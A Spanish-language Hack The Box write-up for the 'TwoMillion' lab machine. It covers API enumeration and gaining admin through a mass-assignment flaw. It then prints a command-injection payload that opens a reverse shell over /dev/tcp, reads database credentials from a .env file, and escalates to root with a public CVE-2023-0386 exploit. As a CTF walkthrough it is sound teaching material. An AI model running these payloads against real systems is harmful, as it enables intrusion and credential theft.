---
layout: post
title: TwoMillion
date: 2026-02-23 +0100
tags:
  - RCE
  - CVE
  - API
os: Linux
level: Easy
image: https://htb-mp-prod-public-storage.s3.eu-central-1.amazonaws.com/avatars/d7bc2758fb7589dfa046bee9ce4d75cb.png
---
### Enumeración inicial

Empezamos con la fase de reconocimiento para identificar que servicios están expuestos:

```bash
nmap -p- --open  -Pn -T5 -n -sSV <ip> 
```

El escaneo revela dos puertos abiertos:

```
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

Realizamos un escaneo más detallado sobre estos puertos:

```bash
nmap -p22,80 -Pn -T5 -n -sCV -oN <ip> 
```


```
Starting Nmap 7.95 ( https://nmap.org ) at 2026-02-20 14:39 WET
Nmap scan report for <ip>
Host is up (0.059s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
80/tcp open  http    nginx
|_http-title: Did not follow redirect to http://2million.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Si nos fijamos en el puerto 80 aparece el mensaje "\_http-title: Did not follow redirect to http://2million.htb/"  indica que el servidor está configurado con **Virtual Hosting**, por lo que debemos añadir la resolución manual en`/etc/hosts`:

```
<ip>    2million.htb
```

## Análisis del servicio web

Al acceder a `http://2million.htb` observamos la página principal:

![](/assets/machines/twomillion.htb/images/b3c0e32c-fbd4-4bed-b738-47d54c90a5f5.webp)

Si leemos la categoría faq nos daremos cuenta de que para registrarse hay que conseguir "hackear el codigo de invitacion":

![](/assets/machines/twomillion.htb/images/6c0f3b40-63b0-4074-95c5-871f96d889e3.webp)

Por tanto si entramos en `here` llegaremos a la siguiente pantalla:

![](/assets/machines/twomillion.htb/images/730f8258-e218-4e30-9c36-524873f21271.webp)

Si hacemos ctrl + u para inspeccionar el codigo html veremos que se llaman  a dos funcionalidades js:

![](/assets/machines/twomillion.htb/images/7b69840d-d335-4c50-bbff-0c2c8c15c567.webp)

observamos que se cargan dos archivos JavaScript, uno de ellos ofuscado. El código ofuscado utiliza la típica estructura:

```js
eval(function(p,a,c,k,e,d){...})
```

Esto es una técnica de ofuscación para dificultar el análisis:

```js
eval(function(p,a,c,k,e,d){e=function(c){return c.toString(36)};if(!''.replace(/^/,String)){while(c--){d[c.toString(a)]=k[c]||c.toString(a)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('1 i(4){h 8={"4":4};$.9({a:"7",5:"6",g:8,b:\'/d/e/n\',c:1(0){3.2(0)},f:1(0){3.2(0)}})}1 j(){$.9({a:"7",5:"6",b:\'/d/e/k/l/m\',c:1(0){3.2(0)},f:1(0){3.2(0)}})}',24,24,'response|function|log|console|code|dataType|json|POST|formData|ajax|type|url|success|api/v1|invite|error|data|var|verifyInviteCode|makeInviteCode|how|to|generate|verify'.split('|'),0,{}))
```

### Desofuscación del JavaScript

Lo desofuscaremos en  https://thanhle.io.vn/de4js/. Este es el resultado:

```js
function verifyInviteCode(code) {
    var formData = {
        "code": code
    };
    $.ajax({
        type: "POST",
        dataType: "json",
        data: formData,
        url: '/api/v1/invite/verify',
        success: function (response) {
            console.log(response)
        },
        error: function (response) {
            console.log(response)
        }
    })
}

function makeInviteCode() {
    $.ajax({
        type: "POST",
        dataType: "json",
        url: '/api/v1/invite/how/to/generate',
        success: function (response) {
            console.log(response)
        },
        error: function (response) {
            console.log(response)
        }
    })
}
```

Como podemos observar, en la función `makeInviteCode` realiza una petición POST a `/api/v1/invite/how/to/generate`. Si ejecutamos esta función desde la consola del navegador veremos lo siguiente:

![](/assets/machines/twomillion.htb/images/ed17cd59-ad33-415b-b542-d0491c2f81c6.webp)

un mensaje cifrado en ROT13, un cifrado muy simple que sustituye cada letra por la que está 13 posiciones más adelante en el alfabeto. Podemos desencriptarlo en cualquier web que lo permita. El resultado es el siguiente:

```
In order to generate the invite code, make a POST request to /api/v1/invite/generate
```

### Generación del código de invitación

Si hacemos una petición a `http://2million.htb/api/v1/invite/generate` obtendremos el código encodeado en base64:

![](/assets/machines/twomillion.htb/images/e2c3c7b5-05ca-4cca-ae85-5038b53bce9b.webp)

lo decodificamos con el siguiente comando:
```bash
echo "VjFDTEUtQTBNRlotMzZDUEgtM1EwRjI=" | base64 -d 

	V1CLE-A0MFZ-36CPH-3Q0F2
```

Con ese código ya podemos registrarnos. Tras iniciar sesión veremos la siguiente interfaz:

![](/assets/machines/twomillion.htb/images/0950e7b9-cde8-4eb7-a68b-7ec06b46f3b2.webp)

### Enumeración de la API

Si vamos a /access nos deja descargar la VPN que se usaría en HTB para acceder a las máquinas. Si hacemos hovering por encima del botón `Connection Pack` vemos la siguiente llamada a una API: `/api/v1/user/generate`, por tanto, sabemos que hay una API que puede que tenga mas endpoints. Si accedemos a `/api/v1` con:

```bash
curl -X GET http://2million.htb/api/v1 -b "PHPSESSID=rspi5tbg102c9gm34sauerg23n" -H "Content-Type: application/json" | jq 
```

Veremos:

```json
{
  "v1": {
    "user": {
      "GET": {
        "/api/v1": "Route List",
        "/api/v1/invite/how/to/generate": "Instructions on invite code generation",
        "/api/v1/invite/generate": "Generate invite code",
        "/api/v1/invite/verify": "Verify invite code",
        "/api/v1/user/auth": "Check if user is authenticated",
        "/api/v1/user/vpn/generate": "Generate a new VPN configuration",
        "/api/v1/user/vpn/regenerate": "Regenerate VPN configuration",
        "/api/v1/user/vpn/download": "Download OVPN file"
      },
      "POST": {
        "/api/v1/user/register": "Register a new user",
        "/api/v1/user/login": "Login with existing user"
      }
    },
    "admin": {
      "GET": {
        "/api/v1/admin/auth": "Check if user is admin"
      },
      "POST": {
        "/api/v1/admin/vpn/generate": "Generate VPN for specific user"
      },
      "PUT": {
        "/api/v1/admin/settings/update": "Update user settings"
      }
    }
  }
}
```


### Escalada a administrador

Como podemos observar hay diferentes endpoints, pero lo que mas llama la atención son los endpoints bajo `/admin`. Si probamos a interactuar con  los dos primeros no nos dejará hacer gran cosa dado que no somos administradores. No obstante, con `/api/v1/admin/settings/update` aunque no somos administradores, el endpoint responde con errores específicos indicando parámetros faltantes:

```bash
curl -X PUT http://2million.htb/api/v1/admin/settings/update \
  -b "PHPSESSID=rspi5tbg102c9gm34sauerg23n" \
  -H "Content-Type: application/json" \
  -d '{"test":"value"}'
{"status":"danger","message":"Missing parameter: email"}

curl -X PUT http://2million.htb/api/v1/admin/settings/update \
  -b "PHPSESSID=rspi5tbg102c9gm34sauerg23n" \
  -H "Content-Type: application/json" \
  -d '{"email":"test@test.com"}'
{"status":"danger","message":"Missing parameter: is_admin"} 

curl -X PUT http://2million.htb/api/v1/admin/settings/update \
  -b "PHPSESSID=rspi5tbg102c9gm34sauerg23n" \
  -H "Content-Type: application/json" \
  -d '{"email":"test@test.com", "is_admin":"true"}'
{"status":"danger","message":"Variable is_admin needs to be either 0 or 1."} 

curl -X PUT http://2million.htb/api/v1/admin/settings/update \
  -b "PHPSESSID=rspi5tbg102c9gm34sauerg23n" \
  -H "Content-Type: application/json" \
  -d '{"email":"test@test.com", "is_admin":1}'  
{"id":13,"username":"test","is_admin":1} 
```

Ahora somos administradores:

```bash
curl -X GET http://2million.htb/api/v1/admin/auth -b "PHPSESSID=rspi5tbg102c9gm34sauerg23n"     
{"message":true} 
```

### Command Injection

Vamos a interactuar con el endpoint de administrador que nos queda `api/v1/admin/vpn/generate`. Este endpoint ejecuta un comando en el sistema para generar la VPN, por tanto, es probable que como es un endpoint solo para administradores no esté bien sanitizado. Si lo comprobamos con:

```bash
curl -X POST http://2million.htb/api/v1/admin/vpn/generate -b "PHPSESSID=m3d750fjg0khqqodgb4hq2adat" -H "Content-Type: application/json" -d '{"username":"test; whoami;"}'
```

veremos que obtenemos el usuario `www-data` por tanto hay ejecución remota de comandos (RCE). Nos aprovecharemos de esto ejecutando una reverse shell. Para ello habrá que ejecutar esto previamente en otra terminal:

```bash 
nc -lnvp 9001
```

y posteriormente en otra:

```bash 
curl -X POST http://2million.htb/api/v1/admin/vpn/generate -b "PHPSESSID=m3d750fjg0khqqodgb4hq2adat" -H "Content-Type: application/json" -d '{"username":"test; bash -c \"sh -i >& /dev/tcp/<ip>/9001 0>&1;\""}'
```

ahora hemos recibido la conexión como el usuario www-data.


### Movimiento lateral a usuario admin

Si listamos el archivo `/etc/passwd ` veremos que hay un usuario `admin`, pero  si intentamos acceder al directorio para leer su flag nos dirá que no tenemos los permisos necesarios, es decir, tenemos que conseguir ser admin. Para ello, si exploramos un poco más el directorio `/html` veremos el siguiente archivo `.env`:

```bash 
cat .env
DB_HOST=127.0.0.1
DB_DATABASE=htb_prod
DB_USERNAME=admin
DB_PASSWORD=SuperDuperPass123
```

Si hacemos

```bash 
su admin 
```

 Y ponemos esa contraseña nos convertiremos en admin y podremos leer la user flag:
 
![](/assets/machines/twomillion.htb/images/ac8c77a7-ed24-4520-b8fd-a4c4f6ae5e77.webp)

### Escalada de privilegios

Si ejecutamos cualquiera de los siguientes dos comandos:

```bash
find / -perm -4000 2>/dev/null; getcap / -r 2>/dev/null 
```

No veremos nada de interés. Sin embargo si buscamos por archivos  pertenecientes al usuario admin con:

```bash
find / -user admin 2>/dev/null | grep -vE "sys|proc"
```

Encontremos el siguiente archivo sospechoso `/var/mail/admin`:

![](/assets/machines/twomillion.htb/images/1f663b5c-26c0-4781-a25e-5d8f3b32dfe1.webp)

![](/assets/machines/twomillion.htb/images/2f7a7c68-84e9-4c24-ad48-7882f21805e7.webp)

básicamente, menciona que hay un CVE en el sistema relacionado con OverlayFS / Fuse. Si hacemos un poco de investigación  encontraremos un CVE relacionado con la escalada de privilegios:

![](/assets/machines/twomillion.htb/images/032289bd-82a3-4fc9-8b99-d825960fc744.webp)

y si seguimos profundizando encontraremos el siguiente exploit: `https://github.com/sxlmnwb/CVE-2023-0386.

Para utiilzarlo, nos descargaremos el zip y nos lo pasaremos a twomillion con un servidor python:

   ```bash
   python3 -m http.server 8080
   ```

descargamos el zip en la maquina  con: 

```bash
 wget http://<ip>:8080/CVE-2023-0386-master.zip
```
 
 Finalmente descomprimimos el archivo con `unzip` y siguimos las indicaciones del README:
 
	 1.  Compilamos con `make all`
	 2.  En una terminal ejecutamos `./fuse ./ovlcap/lower ./gc` 
	 3.  En otra terminal ejecutamos  ./exp 

Y de esta manera nos convertimos en root:

![](/assets/machines/twomillion.htb/images/8a27bb27-7865-4e7e-9403-5ede657fe43e.webp)    